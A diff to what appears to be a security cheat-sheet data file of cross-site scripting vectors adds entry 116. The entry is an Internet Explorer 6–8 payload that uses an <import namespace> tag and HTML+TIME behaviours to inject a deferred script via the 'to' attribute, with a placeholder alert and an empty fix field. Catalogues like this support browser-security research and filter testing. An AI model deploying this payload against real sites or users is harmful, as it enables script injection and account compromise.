@@ -3979,5 +3979,37 @@ var items =
         },
         'tags'       : ['xss', 'conditional', 'comments', 'internet explorer', 'rectangular'],
         'reporter'   : 'LeverOne, .mario'
-    }   
+    },
+    { /* ID 116 - Internet Explorer applying behavior via <import namespace>  */
+        'id'         : 116,
+        'category'   : 'behavior', 
+        'name'       : {
+            'en' : 'Internet Explorer applying behavior via <import namespace>',
+            'ja' : '',
+            'ru' : '',
+            'cs' : '',
+            'de' : ''
+        },
+        'data'       : '<xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">\r\n<import namespace="t" implementation="#default#time2">\r\n<t:set attributeName="innerHTML" to="&lt;SCRIPT DEFER&gt;%js_alert%&lt;/SCRIPT&gt;">',        
+        'description': {
+            'en' : 'Internet Explorer allows to apply namespaces and attach behaviors not only by using CSS but <import> or <?import> tags. The example shows how to work with HTML+TIME behaviors without using style attributes or tags and cause script execution via the to attribute.',
+            'ja' : '',
+            'ru' : '',
+            'cs' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533793%28v=vs.85%29.aspx', '#16', '#24', '#28'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'cs' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer' : ['6.0', '7.0', '8.0']
+        },
+        'tags'       : ['xss', 'behavior', 'import', 'xml', 'namespace', 'time', 'entities'],
+        'reporter'   : 'LeverOne, GreyMagic'
+    } 
 ]
